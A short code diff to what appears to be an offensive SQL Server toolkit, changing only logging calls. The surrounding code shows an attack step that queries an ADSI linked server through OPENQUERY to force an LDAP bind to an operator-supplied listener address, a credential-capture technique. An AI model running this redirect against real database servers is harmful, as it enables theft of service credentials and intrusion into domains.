@@ -51,12 +51,12 @@ namespace MSSQLand.Actions.Domain
                 if (servers.Count == 0)
                 {
                     Logger.Error("No ADSI linked server found on the execution target.");
-                    Logger.InfoNested("List linked servers with: links");
+                    Logger.TaskNested("List linked servers with: links");
                     return null;
                 }
 
                 _targetServer = servers[0];
-                Logger.Info($"Found existing ADSI linked server: '{_targetServer}'");
+                Logger.TaskNested($"Found existing ADSI linked server: '{_targetServer}'");
             }
             else if (!adsiService.AdsiServerExists(_targetServer))
             {
@@ -68,7 +68,7 @@ namespace MSSQLand.Actions.Domain
             string listenerAddr = _listenerAddress.Contains(":") ? _listenerAddress : $"{_listenerAddress}:389";
             string redirectQuery = $"SELECT * FROM OPENQUERY([{_targetServer}], 'SELECT * FROM ''LDAP://{listenerAddr}'' ')";
 
-            Logger.Task($"Redirecting ADSI LDAP bind via '{_targetServer}' to {listenerAddr}");
+            Logger.TaskNested($"Redirecting ADSI LDAP bind via '{_targetServer}' to {listenerAddr}");
             try
             {
                 databaseContext.QueryService.ExecuteNonProcessing(redirectQuery);
